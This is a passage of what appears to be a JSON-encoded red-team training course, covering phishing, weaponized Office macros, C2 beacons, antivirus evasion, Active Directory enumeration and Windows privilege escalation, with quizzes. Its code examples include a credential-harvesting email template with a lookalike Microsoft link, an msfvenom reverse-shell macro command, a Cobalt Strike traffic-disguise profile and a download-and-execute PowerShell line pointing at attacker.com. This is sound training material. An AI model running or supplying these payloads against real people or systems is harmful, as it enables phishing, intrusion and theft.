                "Learn how to craft a convincing phishing email (lure)",
                "Explore techniques for credential harvesting",
                "Analyze methods for payload delivery via malicious links and attachments",
                "Set up and execute a phishing campaign using GoPhish"
            ],
            "content": {
                "overview": "Phishing is the most common method for achieving initial access. This lesson moves from reconnaissance to active engagement, covering the art and science of crafting a targeted spear-phishing campaign to either steal user credentials or deliver a malicious payload.",
                "sections": [
                    {
                        "title": "Crafting a Convincing Lure",
                        "content": "<p>A <strong>spear-phishing</strong> attack is a targeted phishing attack that is customized for a specific individual or organization. The information gathered during OSINT is used to make the email (the 'lure') as convincing as possible.</p><h3>Elements of a Good Lure:</h3><ul><li><strong>Spoofed Sender:</strong> Making the email appear to come from a trusted source, like an internal IT department or a known business partner.</li><li><strong>Context and Relevance:</strong> The content of the email should be relevant to the target's job role. For example, sending a fake invoice to someone in the finance department.</li><li><strong>Urgency and Authority:</strong> The email often creates a sense of urgency or purports to be from a person in authority (like the CEO) to pressure the victim into acting without thinking.</li></ul>",
                        "image": "https://images.unsplash.com/photo-1554224155-169544351748?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Credential Harvesting vs. Payload Delivery",
                        "content": "<p>A phishing campaign can have two primary goals:</p><ul><li><strong>Credential Harvesting:</strong> The email contains a link to a fake login page (e.g., a clone of the Microsoft 365 login page). The goal is to trick the user into entering their username and password, which are then captured by the attacker.</li><li><strong>Payload Delivery:</strong> The email contains a link to a malicious file or a malicious attachment. The goal is to trick the user into opening the file, which then executes the attacker's C2 implant on their machine.</li></ul>",
                        "image": "https://i.imgur.com/k2H1z5F.png"
                    },
                    {
                        "title": "Phishing Campaign Platforms",
                        "content": "<p>Specialized platforms are used to manage phishing campaigns. <strong>GoPhish</strong> is a popular, open-source phishing framework that allows an operator to:</p><ul><li>Create email templates and landing pages.</li><li>Manage target user lists.</li><li>Schedule and launch phishing campaigns.</li><li>Track the results in real-time (who opened the email, who clicked the link, who submitted credentials).</li></ul>",
                        "image": "https://images.unsplash.com/photo-1573495627361-ab2d_50a8a86a?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "GoPhish_Email_Template_with_Credential_Link.html",
                    "language": "html",
                    "code": "<html>\n<body>\n  <p>Hello {{.FirstName}},</p>\n  <p>Your mailbox is almost full. To prevent a disruption of service, please log in to the Outlook Web App portal to increase your storage quota immediately.</p>\n  \n  <!-- The 'rid' parameter is a unique ID for tracking the user -->\n  <p><a href=\"https://login.microsft.corp-site.com/?rid={{.RId}}\">Click here to log in</a></p>\n\n  <p>Thank you,</p>\n  <p>IT Support</p>\n</body>\n</html>"
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary difference between general phishing and spear-phishing?",
                        "options": [
                            "There is no difference.",
                            "Spear-phishing is highly targeted and customized for a specific individual or organization.",
                            "General phishing uses links, while spear-phishing uses attachments.",
                            "Spear-phishing is easier to detect."
                        ],
                        "correct": 1,
                        "explanation": "Spear-phishing leverages the information gathered during OSINT to create a much more believable and effective lure, making it the preferred technique for targeted attacks."
                    },
                    {
                        "id": 2,
                        "question": "What is 'credential harvesting'?",
                        "options": [
                            "Delivering a malware payload.",
                            "Tricking a user into entering their username and password into a fake login page.",
                            "Encrypting a user's files.",
                            "Sending a lot of spam email."
                        ],
                        "correct": 1,
                        "explanation": "The goal of credential harvesting is to steal the user's login credentials, which the attacker can then use to gain legitimate access to corporate systems."
                    },
                    {
                        "id": 3,
                        "question": "A platform like GoPhish is used by a red team for what purpose?",
                        "options": [
                            "To send and track the results of a simulated phishing campaign.",
                            "To manage their C2 server.",
                            "To analyze malware.",
                            "To write the final report."
                        ],
                        "correct": 0,
                        "explanation": "GoPhish is a full-featured phishing framework that automates the process of creating, sending, and monitoring a campaign, making it an essential tool for this phase of an operation."
                    }
                ]
            }
        },
        {
            "id": "lesson-7",
            "title": "Weaponizing Payloads and Documents",
            "duration": "75 min",
            "objectives": [
                "Understand how to create malicious Microsoft Office macros",
                "Learn about the use of HTA and LNK files for payload delivery",
                "Use tools like msfvenom to generate shellcode and stagers",
                "Combine these techniques to craft a weaponized document"
            ],
            "content": {
                "overview": "Once an attacker has convinced a user to click a link or open a document, they need a way to execute their code. This lesson covers the techniques for 'weaponizing' common file types, like Office documents, to act as a delivery vehicle for the initial C2 implant.",
                "sections": [
                    {
                        "title": "Microsoft Office Macros",
                        "content": "<p><strong>VBA (Visual Basic for Applications) macros</strong> are a powerful scripting language built into Microsoft Office. While they have legitimate uses, they are also a classic vector for malware delivery. An attacker can embed a malicious macro into a Word or Excel document.</p><p>When the victim opens the document and enables macros, the VBA code executes. This code is often a small 'stager' whose only job is to download and run the main C2 implant from a remote server. This is a very common technique because it relies on tricking the user, not on exploiting a software vulnerability.</p>",
                        "image": "https://i.imgur.com/k2H1z5F.png"
                    },
                    {
                        "title": "HTA and LNK Files",
                        "content": "<ul><li><strong>HTA (HTML Application):</strong> An HTA file is an HTML file that is executed by the Windows `mshta.exe` binary. It can run scripts (like JScript or VBScript) with the permissions of a normal application, outside the browser's sandbox. An attacker can trick a user into running an HTA file that then downloads and executes a payload.</li><li><strong>LNK (Shortcut) Files:</strong> A Windows shortcut file can be weaponized to do more than just open a program. An attacker can craft an LNK file that, when clicked, executes a PowerShell command to download and run the C2 implant. These can be hidden inside a ZIP archive to look like a normal document.</li></ul>",
                        "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Payload Generation Tools",
                        "content": "<p>Tools are used to generate the actual code that will be executed by the macro or script. The <strong>Metasploit Framework</strong> is a powerful penetration testing tool that includes a payload generator called <strong>msfvenom</strong>.</p><div class='info-box note'><div class='info-box-header'><i class='fas fa-info-circle'></i><strong>Using msfvenom</strong></div><p>An operator can use msfvenom to generate a C2 stager for their specific C2 framework (e.g., Cobalt Strike or Metasploit itself) in a variety of formats, including as a VBA macro, a PowerShell script, or raw shellcode. This automates the process of creating the malicious payload that will be embedded in the weaponized document.</p></div>",
                        "image": "https://images.unsplash.com/photo-1573495627361-ab2d_50a8a86a?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "Generate_VBA_Macro_Payload_with_msfvenom.sh",
                    "language": "bash",
                    "code": "# This command uses msfvenom to generate a VBA macro payload.\n# The payload is a reverse HTTPS stager that will connect back to our C2 server.\n\nLHOST=your_c2_ip\nLPORT=443\n\nmsfvenom -p windows/x64/meterpreter/reverse_https -f vba -o payload.vba LHOST=$LHOST LPORT=$LPORT\n\n# The output file 'payload.vba' will contain the malicious macro code.\n# The operator would then copy and paste this code into a Word document's\n# macro editor."
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary security risk associated with Microsoft Office macros?",
                        "options": [
                            "They make documents larger.",
                            "They can be used to execute arbitrary code on a victim's machine if a user is tricked into enabling them.",
                            "They slow down the computer.",
                            "They are a type of software vulnerability."
                        ],
                        "correct": 1,
                        "explanation": "Macros are a powerful scripting engine. Attackers abuse this by embedding malicious scripts in documents that act as a stager to download and run malware."
                    },
                    {
                        "id": 2,
                        "question": "What is the purpose of a 'stager' payload?",
                        "options": [
                            "To perform the final malicious action.",
                            "It is a small initial payload whose only job is to download and execute the larger, main C2 implant.",
                            "To encrypt files.",
                            "To steal passwords."
                        ],
                        "correct": 1,
                        "explanation": "Stagers are used to keep the initial payload small and evasive. The weaponized document contains only the small stager, and the main C2 beacon is downloaded from the internet, which is less likely to be caught by email scanners."
                    },
                    {
                        "id": 3,
                        "question": "A tool like msfvenom is used by an attacker for what purpose?",
                        "options": [
                            "To send phishing emails.",
                            "To manage a C2 server.",
                            "To automatically generate shellcode and payloads in various formats.",
                            "To scan for vulnerabilities."
                        ],
                        "correct": 2,
                        "explanation": "msfvenom is a payload generator. It's a versatile tool that can create customized stagers and shellcode for a wide variety of scenarios and output formats."
                    }
                ]
            }
        },
        {
            "id": "lesson-8",
            "title": "Exploiting Public-Facing Applications",
            "duration": "75 min",
            "objectives": [
                "Understand the importance of scanning for vulnerabilities on external services",
                "Learn how to identify common vulnerabilities in web servers and VPNs",
                "Analyze recent, high-impact vulnerabilities like Log4Shell and ProxyLogon",
                "Use vulnerability scanners like Nmap to find potential weaknesses"
            ],
            "content": {
                "overview": "While phishing is a common entry point, attackers can also gain initial access by exploiting a software vulnerability in a target's internet-facing applications. This lesson covers the process of identifying and exploiting these external vulnerabilities to gain a foothold in the network.",
                "sections": [
                    {
                        "title": "Identifying Public-Facing Vulnerabilities",
                        "content": "<p>An organization's external attack surface consists of all the systems they expose to the internet, such as:</p><ul><li>Web servers</li><li>Email gateways</li><li>VPN concentrators</li><li>Remote Desktop gateways</li></ul><p>The first step for an attacker is to perform a <strong>vulnerability scan</strong> against these systems to identify any known, unpatched vulnerabilities. Tools like <strong>Nmap (Network Mapper)</strong> with its Nmap Scripting Engine (NSE), or dedicated web vulnerability scanners, are used for this purpose.</p>",
                        "image": "https://images.unsplash.com/photo-1510915228340-29c85a43dcfe?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "High-Impact Vulnerabilities",
                        "content": "<p>Sometimes, a single, critical vulnerability can provide an attacker with immediate access to a large part of the internet. These vulnerabilities often allow for <strong>Remote Code Execution (RCE)</strong>.</p><h3>Recent Examples:</h3><ul><li><strong>Log4Shell (CVE-2021-44228):</strong> A critical RCE vulnerability in a very widely used Java logging library called Log4j. An attacker could simply send a specially crafted string to a web server, and if the server logged that string using a vulnerable version of Log4j, the attacker could gain full control of the server.</li><li><strong>ProxyLogon:</strong> A chain of vulnerabilities in Microsoft Exchange Server that allowed an attacker to bypass authentication and execute code as a privileged user, giving them access to the entire email system.</li></ul><p>When a vulnerability like this is disclosed, attackers and defenders race to find and patch/exploit vulnerable systems.</p>",
                        "image": "https://i.imgur.com/k2H1z5F.png"
                    }
                ],
                "codeExamples": [
                    {
                        "title": "nmap --script=vuln -p- target-ip.com",
                        "language": "bash",
                        "code": "# Nmap is a powerful network scanner.\n# This command tells Nmap to scan a target IP.\n# -p- : Scan all 65,535 TCP ports.\n# --script=vuln : Run all the scripts in the 'vuln' category.\n# The NSE scripts can detect a wide range of common, known vulnerabilities.\n\n# --- Sample Output ---\n# PORT      STATE SERVICE\n# 80/tcp    open  http\n# | http-vuln-cve2017-5638: VULNERABLE!\n# |   State: LIKELY VULNERABLE\n# |   IDs:  CVE:CVE-2017-5638\n# |   The vulnerability allows remote attackers to execute arbitrary commands...\n# |_  Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638"
                    }
                ]
            },
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary goal of exploiting a public-facing application in a red team engagement?",
                        "options": [
                            "To test the application's performance.",
                            "To gain an initial foothold in the target network.",
                            "To write a report about the application.",
                            "To improve the application's user interface."
                        ],
                        "correct": 1,
                        "explanation": "Exploiting an external vulnerability is an alternative to phishing for achieving initial access. A successful exploit can provide the attacker with a shell on a server inside the network perimeter."
                    },
                    {
                        "id": 2,
                        "question": "A vulnerability that allows an attacker to run their own code on a target server is known as what?",
                        "options": [
                            "Cross-Site Scripting (XSS)",
                            "A denial-of-service vulnerability",
                            "Remote Code Execution (RCE)",
                            "An information disclosure vulnerability"
                        ],
                        "correct": 2,
                        "explanation": "RCE is the holy grail for attackers. It provides the highest level of impact, giving the attacker direct control over the compromised system."
                    },
                    {
                        "id": 3,
                        "question": "What is the purpose of a vulnerability scanner like Nmap?",
                        "options": [
                            "To automatically exploit all vulnerabilities it finds.",
                            "To identify open ports, running services, and known vulnerabilities on a target system.",
                            "To manage a C2 server.",
                            "To send phishing emails."
                        ],
                        "correct": 1,
                        "explanation": "A vulnerability scanner is a reconnaissance tool. It probes a target to find potential weaknesses that an attacker can then investigate and attempt to exploit."
                    }
                ]
            }
        },
        {
            "id": "lesson-9",
            "title": "Command & Control (C2) Operations",
            "duration": "75 min",
            "objectives": [
                "Understand the role and function of a C2 channel",
                "Learn about common C2 protocols (HTTP/S, DNS)",
                "Explore the basics of managing compromised hosts (beacons)",
                "Practice tasking an agent and handling callbacks",
                "Understand the concept of a C2 profile for evasion"
            ],
            "content": {
                "overview": "Once an attacker has gained execution on a host, the implant must 'call home' to the C2 server to receive commands. This lesson covers the fundamentals of C2 operations: how these communication channels work, how operators manage them, and how the traffic is disguised to blend in with normal network activity.",
                "sections": [
                    {
                        "title": "The C2 Channel",
                        "content": "<p>The <strong>Command and Control (C2)</strong> channel is the communication link between the attacker's server and the implant running on the compromised host. The implant periodically connects to the C2 server to check for new tasks. This periodic connection is called a <strong>beacon</strong>.</p><h3>Common C2 Protocols:</h3><ul><li><strong>HTTP/S:</strong> The most common C2 protocol. The beacon's traffic is disguised to look like normal web browsing. A GET request is used to ask for tasks, and a POST request is used to send back the results. Using HTTPS encrypts the traffic and makes it harder for defenders to inspect.</li><li><strong>DNS:</strong> A stealthier but slower channel. The implant can request tasks and send back data by encoding it in a series of DNS queries to a domain controlled by the attacker. This often bypasses firewalls, as DNS traffic is almost always allowed.</li></ul>",
                        "image": "https://i.imgur.com/u7y7o9o.png"
                    },
                    {
                        "title": "Managing Beacons",
                        "content": "<p>The C2 framework (like Cobalt Strike or Sliver) provides an interface for the operator to manage all of their active beacons.</p><h3>Key Operational Concepts:</h3><ul><li><strong>Sleep Time:</strong> The beacon is not constantly connected. It 'sleeps' for a configured interval (e.g., 60 seconds) and then calls back. A longer sleep time is stealthier but makes the implant less responsive.</li><li><strong>Jitter:</strong> To avoid a perfectly regular beaconing pattern, a 'jitter' percentage is configured. If the sleep time is 60 seconds with 50% jitter, the actual callback time will be a random value between 30 and 90 seconds.</li><li><strong>Tasking:</strong> The operator issues a command (e.g., `whoami`) to the beacon. The command is queued on the C2 server. The next time the beacon checks in, it downloads the task, executes it, and sends the output back on its next beacon.</li></ul>",
                        "image": "https://i.imgur.com/F0f5d8g.png"
                    }
                ],
                "codeExamples": [
                    {
                        "title": "C2_Beacon_Configuration_with_Custom_Profile.profile",
                        "language": "properties",
                        "code": "# This is an excerpt from a Cobalt Strike Malleable C2 profile.\n# It customizes the beacon's network traffic to look like legitimate traffic.\n\nset sleep_time \"60000\"; # 60 seconds in milliseconds\nset jitter \"20\";      # 20% jitter\n\nhttp-get {\n    # The client side of a transaction\n    client {\n        # The metadata of the GET request\n        header \"Accept\" \"*/*\";\n        header \"Host\" \"updates.jquery.com\";\n        uri \"/version-1.8/jquery.min.js\";\n        \n        metadata {\n            # Where to put the beacon's metadata (e.g., in a cookie)\n            header \"Cookie\";\n        }\n    }\n    # The server side of a transaction\n    server {\n        header \"Content-Type\" \"application/javascript\";\n        # Where the server will embed the tasks for the beacon\n        output {\n            prepend \"var jquery_version = \\\"1.8.3\\\";\";\n            print;\n        }\n    }\n}"
                    }
                ]
            },
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is a C2 'beacon'?",
                        "options": [
                            "A vulnerability.",
                            "The periodic connection from an implant on a compromised host back to the C2 server.",
                            "The C2 server itself.",
                            "A phishing email."
                        ],
                        "correct": 1,
                        "explanation": "The implant 'beacons' back to its controller to check for new commands. This periodic, sleeping behavior is a key characteristic of modern C2 frameworks."
                    },
                    {
                        "id": 2,
                        "question": "Why is HTTP/S a commonly used protocol for C2 traffic?",
                        "options": [
                            "It is the fastest protocol.",
                            "It is very easy for defenders to detect.",
                            "It allows the attacker's traffic to blend in with normal web browsing, and HTTPS encrypts the content.",
                            "It is the only protocol that C2 frameworks support."
                        ],
                        "correct": 2,
                        "explanation": "Blending in is key to evasion. Since most organizations have a huge amount of web traffic, it's a perfect place for an attacker to hide their C2 communications."
                    },
                    {
                        "id": 3,
                        "question": "What is the purpose of 'jitter' in a beacon's configuration?",
                        "options": [
                            "To make the connection faster.",
                            "To make the beacon's callbacks happen at perfectly regular intervals.",
                            "To make the beacon's callback times slightly random, which is a stealth technique to evade detection.",
                            "To encrypt the traffic."
                        ],
                        "correct": 2,
                        "explanation": "A perfectly regular connection every 60 seconds is a very strong, machine-like signal that a defender can easily detect. Jitter adds randomness to make the traffic pattern look more human and less predictable."
                    }
                ]
            }
        },
        {
            "id": "lesson-10",
            "title": "Initial Endpoint Evasion",
            "duration": "75 min",
            "objectives": [
                "Understand the difference between signature-based and behavioral-based AV",
                "Learn techniques to bypass basic antivirus signatures",
                "Explore the concept of in-memory execution",
                "Understand the basics of Application Whitelisting and how to bypass it"
            ],
            "content": {
                "overview": "Once an attacker has delivered their payload, they face their first major defensive obstacle: the antivirus (AV) and Endpoint Detection & Response (EDR) solutions running on the host. This lesson covers the initial techniques that attackers use to evade these endpoint defenses and get their code to execute.",
                "sections": [
                    {
                        "title": "Bypassing Signature-Based AV",
                        "content": "<p>Traditional antivirus products work by maintaining a large database of <strong>signatures</strong>—unique hashes or byte patterns of known malware files. This is very effective at catching known threats, but it is also very easy to bypass.</p><p>An attacker can take a known malicious payload and make a tiny, functionally irrelevant change to it (e.g., adding a single byte). This will change the file's hash, causing it to no longer match the AV's signature, even though the file is still malicious. More advanced techniques include:<ul><li><strong>Payload Encoding:</strong> Using a simple algorithm like XOR to encrypt the payload. The stager will contain a small decoder stub.</li><li><strong>Polymorphism:</strong> Using an engine to automatically generate a unique, newly-encoded version of the payload for each victim.</li></ul></p>",
                        "image": "https://i.imgur.com/3Z4h7k2.png"
                    },
                    {
                        "title": "In-Memory Execution",
                        "content": "<p>A more advanced technique is to avoid writing the main payload to the disk at all. This is called <strong>in-memory execution</strong> or 'fileless' malware.</p><p>The initial stager (e.g., a PowerShell script) will download the main C2 implant from the internet directly into the memory of its own process. It will then execute the implant from memory. Because the malicious code is never written to the disk, a traditional AV scanner that only scans files on disk will never see it. This is a very effective technique for bypassing static, file-based defenses.</p>",
                        "image": "https://images.unsplash.com/photo-1599508704512-2f19efd1e_35f?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Bypassing Application Whitelisting",
                        "content": "<p><strong>Application Whitelisting</strong> is a very strong defense where the operating system is configured to only allow known, trusted applications to run. Any unknown executable will be blocked.</p><p>Attackers bypass this by using a technique called <strong>'Living Off the Land'</strong>. They don't bring their own malicious executables. Instead, they abuse the legitimate, trusted tools that are already on the system (like PowerShell, `mshta.exe`, or `wmic.exe`) to perform their malicious actions. Since PowerShell is a trusted Microsoft application, the whitelisting solution will allow it to run, and the attacker can use it to download and execute their in-memory payload.</p>",
                        "image": "https://images.unsplash.com/photo-1573495627361-ab2d_50a8a86a?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "powershell -exec bypass -enc <Base64_Encoded_Payload>",
                    "language": "powershell",
                    "code": "# This is a common one-liner used to execute a PowerShell payload.\n\n# powershell.exe: The legitimate, trusted PowerShell binary.\n# -exec bypass: A flag to bypass the local script execution policy.\n# -enc: A flag that tells PowerShell the following argument is a Base64-encoded command.\n\n# <Base64_Encoded_Payload>: The attacker's script (e.g., a C2 stager) is encoded in Base64.\n# This prevents the command from being easily seen in logs and can bypass simple string matching.\n\n# Example of what the decoded payload might be:\n# \"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')\""
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "Why is a simple change to a malware file, like adding a single byte, often enough to bypass a traditional signature-based AV?",
                        "options": [
                            "It makes the file encrypted.",
                            "It changes the file's hash, so it no longer matches the AV's database of known bad hashes.",
                            "It fixes the malicious behavior.",
                            "It makes the file too large for the AV to scan."
                        ],
                        "correct": 1,
                        "explanation": "Signature-based detection is very brittle. Any small change to the file will alter its signature, making it an 'unknown' file to the AV, even though its malicious logic is identical."
                    },
                    {
                        "id": 2,
                        "question": "What is the primary advantage of 'in-memory execution' for an attacker?",
                        "options": [
                            "It is easier to program.",
                            "It runs faster.",
                            "By avoiding writing the malicious payload to the disk, it can bypass security tools that only scan files on disk.",
                            "It uses less memory."
                        ],
                        "correct": 2,
                        "explanation": "'Fileless' malware is a powerful evasion technique because it bypasses a major source of detection telemetry: the file system. Modern EDRs focus on in-memory detection to counter this."
                    },
                    {
                        "id": 3,
                        "question": "What is the 'Living Off the Land' technique?",
                        "options": [
                            "The attacker using their own custom-built tools.",
                            "The attacker abusing legitimate, trusted tools that are already on the system (like PowerShell) to perform their actions.",
                            "The attacker targeting physical infrastructure.",
                            "The attacker working from a remote location."
                        ],
                        "correct": 1,
                        "explanation": "This technique is essential for bypassing application whitelisting. By using trusted system binaries, the attacker's activity can blend in and avoid being blocked by solutions that only allow known executables to run."
                    }
                ]
            }
        },
        {
            "id": "lesson-11",
            "title": "Host-Based Reconnaissance (Living Off the Land)",
            "duration": "75 min",
            "objectives": [
                "Understand the goal of situational awareness after a compromise",
                "Learn how to use built-in Windows and Linux tools for reconnaissance",
                "Explore commands for gathering user, network, and process information",
                "Analyze how to perform these actions stealthily to avoid detection"
            ],
            "content": {
                "overview": "Once an attacker has a beacon on a host, their first step is not to cause damage, but to gather information. This lesson covers the crucial phase of host-based reconnaissance or 'situational awareness', focusing on how an attacker uses the system's own built-in tools to understand the compromised machine and its place in the network.",
                "sections": [
                    {
                        "title": "Situational Awareness",
                        "content": "<p>The attacker needs to answer several key questions before they can proceed:</p><ul><li><strong>Who am I?</strong> (<code>whoami</code>, <code>hostname</code>): What user account have I compromised? What is the name of this computer?</li><li><strong>What is this machine?</strong> (<code>systeminfo</code>): Is it a Windows 10 workstation or a Windows Server 2019? Is it part of a domain?</li><li><strong>What is running on it?</strong> (<code>tasklist</code>, <code>ps</code>): What processes are running? Are there any security tools (EDR) that I need to be aware of?</li><li><strong>What are the network connections?</strong> (<code>netstat</code>, <code>ipconfig</code>): What is the machine's IP address? What other internal systems is it connected to?</li></ul>",
                        "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Living Off the Land (LotL)",
                        "content": "<p>Using built-in system tools is a key part of the <strong>'Living Off the Land'</strong> philosophy. Instead of bringing their own custom reconnaissance tools (which might be flagged by AV), the attacker uses the legitimate tools that are already present on every Windows or Linux system. This makes their activity much harder to distinguish from the normal activity of a system administrator.</p>",
                        "image": "https://i.imgur.com/k2H1z5F.png"
                    }
                ],
                "codeExamples": [
                    {
                        "title": "net user /domain",
                        "language": "batch",
                        "code": ":: This is a common Windows command to start enumerating the network environment.\n\n:: Find the current user's context\nwhoami /all\n\n:: Get detailed system information\nsysteminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"Domain\"\n\n:: List all running processes\ntasklist /v\n\n:: View all active TCP and UDP network connections\nnetstat -ano\n\n:: Discover other users in the domain\nnet user /domain\n\n:: Discover other computers in the domain\nnet view /domain"
                    }
                ]
            },
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary goal of the 'situational awareness' phase?",
                        "options": [
                            "To deploy ransomware.",
                            "For the attacker to gather information about the compromised host and its environment to plan their next steps.",
                            "To delete log files.",
                            "To establish persistence."
                        ],
                        "correct": 1,
                        "explanation": "Before an attacker can move laterally or escalate privileges, they must first understand where they are, who they are, and what defenses are in place. This is a crucial intelligence-gathering step."
                    },
                    {
                        "id": 2,
                        "question": "Why do attackers prefer to use 'Living Off the Land' techniques for reconnaissance?",
                        "options": [
                            "Because their custom tools are not very good.",
                            "Because using the system's own built-in tools (like `whoami` and `netstat`) is stealthier and less likely to be flagged by security software.",
                            "Because they are easier to use.",
                            "Because it is a legal requirement."
                        ],
                        "correct": 1,
                        "explanation": "An EDR is much less likely to be suspicious of a legitimate Windows binary like `net.exe` than it is of a custom-named reconnaissance tool. This technique helps the attacker to blend in."
                    },
                    {
                        "id": 3,
                        "question": "The command `netstat -ano` is used by an attacker to find what information?",
                        "options": [
                            "The user's password.",
                            "The list of running processes.",
                            "The active network connections on the host.",
                            "The operating system version."
                        ],
                        "correct": 2,
                        "explanation": "`netstat` is a standard networking utility. The `-ano` flags show all active TCP and UDP connections, the ports they are listening on, and the process ID associated with each connection. This is a goldmine for understanding the host's role in the network."
                    }
                ]
            }
        },
        {
            "id": "lesson-12",
            "title": "Active Directory (AD) Enumeration",
            "duration": "75 min",
            "objectives": [
                "Understand the basics of Active Directory and why it's a primary target",
                "Learn how to map the AD environment to find users, groups, and computers",
                "Explore the use of tools like PowerView for AD enumeration",
                "Analyze how to use BloodHound to visualize attack paths"
            ],
            "content": {
                "overview": "For most corporate networks, Microsoft Active Directory (AD) is the keys to the kingdom. It manages all user identities, permissions, and access to resources. This lesson covers the critical phase of AD enumeration, where an attacker, from a single compromised host, can map out the entire domain to find a path to total control.",
                "sections": [
                    {
                        "title": "Mapping the AD Environment",
                        "content": "<p>Once an attacker knows they are in an AD environment, their next goal is to understand its structure. As a standard domain user, they can query AD for a vast amount of information without needing any special privileges.</p><h3>Information to Enumerate:</h3><ul><li><strong>Users and Groups:</strong> Who are the Domain Admins? Who is in the 'Finance' group?</li><li><strong>Computers:</strong> What are the names of the servers? Most importantly, where are the Domain Controllers?</li><li><strong>Permissions:</strong> Who has administrative rights on which servers? Are there any easy paths to privilege escalation?</li><li><strong>Trusts:</strong> Does this domain trust other domains in the forest?</li></ul>",
                        "image": "https://i.imgur.com/3Z4h7k2.png"
                    },
                    {
                        "title": "Enumeration with PowerView",
                        "content": "<p><strong>PowerView</strong> is a powerful PowerShell tool that is part of the PowerSploit framework. It allows an operator to easily perform complex AD queries from the command line, all in memory, making it a stealthy and effective enumeration tool.</p>",
                        "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Visualizing Attack Paths with BloodHound",
                        "content": "<p><strong>BloodHound</strong> is a revolutionary tool for AD security. It works in two phases:</p><ol><li><strong>The Ingestor (SharpHound):</strong> A data collection tool that is run on a compromised host. It queries AD for all information about users, groups, computers, sessions, and permissions, and saves it to a set of JSON files.</li><li><strong>The GUI:</strong> The operator loads these JSON files into the BloodHound GUI. BloodHound then builds a graph database of the entire AD environment and uses graph theory to find attack paths.</li></ol><div class='info-box note'><div class='info-box-header'><i class='fas fa-info-circle'></i><strong>Finding the Shortest Path</strong></div><p>An operator can simply right-click on their compromised user and ask BloodHound to find the 'Shortest Path to Domain Admin'. The tool will automatically analyze the complex web of permissions and group memberships to show the exact sequence of steps required to become a domain administrator. This is an incredibly powerful tool for both attackers and defenders.</p></div>",
                        "image": "https://i.imgur.com/kYq3Q6k.png"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "SharpHound.exe -c All",
                    "language": "batch",
                    "code": ":: SharpHound is the data collector for BloodHound.\n:: It can be run from the command line of a compromised, domain-joined host.\n\n:: The '-c All' flag tells SharpHound to run a full collection,\n:: gathering information about domain users, groups, computers, trusts, GPOs, and sessions.\nSharpHound.exe --CollectionMethod All\n\n:: The output will be a ZIP file containing several JSON files.\n:: Example: 20230401103000_BloodHound.zip\n\n:: The operator then exfiltrates this ZIP file from the target network\n:: and loads it into the BloodHound GUI on their own machine for analysis."
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "Why is Active Directory a primary target for attackers in a corporate network?",
                        "options": [
                            "Because it is easy to attack.",
                            "Because it centrally manages all user identities and permissions, so controlling AD means controlling the entire network.",
                            "Because it is not a very common technology.",
                            "Because it stores all the company's files."
                        ],
                        "correct": 1,
                        "explanation": "AD is the 'keys to the kingdom'. Compromising the Domain Controller and becoming a Domain Admin is the ultimate goal for most attackers in an enterprise environment."
                    },
                    {
                        "id": 2,
                        "question": "What is the primary purpose of the BloodHound tool?",
                        "options": [
                            "To exploit vulnerabilities.",
                            "To send phishing emails.",
                            "To collect and visualize Active Directory data as a graph to find attack paths.",
                            "To act as a C2 server."
                        ],
                        "correct": 2,
                        "explanation": "BloodHound revolutionized AD security by applying graph theory. It makes it trivial to find complex and often-unintended privilege escalation paths in an Active Directory environment."
                    },
                    {
                        "id": 3,
                        "question": "Does an attacker need to be a domain administrator to perform AD enumeration?",
                        "options": [
                            "Yes, full admin rights are required.",
                            "No, any authenticated domain user can query a vast amount of information from Active Directory by default.",
                            "Only local administrator rights are needed.",
                            "Yes, and they must be physically at the Domain Controller."
                        ],
                        "correct": 1,
                        "explanation": "This is a key point. The default permissions in Active Directory are very permissive, allowing any user to learn the complete structure of the domain. This is what makes tools like BloodHound so effective."
                    }
                ]
            }
        },
        {
            "id": "lesson-13",
            "title": "Windows Privilege Escalation",
            "duration": "75 min",
            "objectives": [
                "Understand the goal of local privilege escalation",
                "Learn how to exploit misconfigured services and weak permissions",
                "Explore techniques for exploiting missing patches",
                "Analyze the use of automated enumeration scripts like winPEAS"
            ],
            "content": {
                "overview": "Gaining an initial foothold as a standard user is just the first step. The next goal is to escalate privileges on the local machine to become a local Administrator or the all-powerful SYSTEM user. This lesson covers the common techniques for local privilege escalation on a Windows host.",
                "sections": [
                    {
                        "title": "Exploiting Misconfigured Services",
                        "content": "<p>Windows services are programs that run in the background. If a service is misconfigured, it can often be abused to escalate privileges.</p><h3>Common Misconfigurations:</h3><ul><li><strong>Unquoted Service Paths:</strong> If the path to a service's executable contains spaces and is not enclosed in quotes, an attacker can place a malicious executable in a higher-level directory (e.g., `C:\\Program.exe`) that will be executed instead of the legitimate service.</li><li><strong>Insecure Service Permissions:</strong> If a standard user has permission to modify or restart a service that runs as a higher-privileged user, they can change the service's executable to point to their own payload.</li></ul>",
                        "image": "https://i.imgur.com/3Z4h7k2.png"
                    },
                    {
                        "title": "Missing Patches and Kernel Exploits",
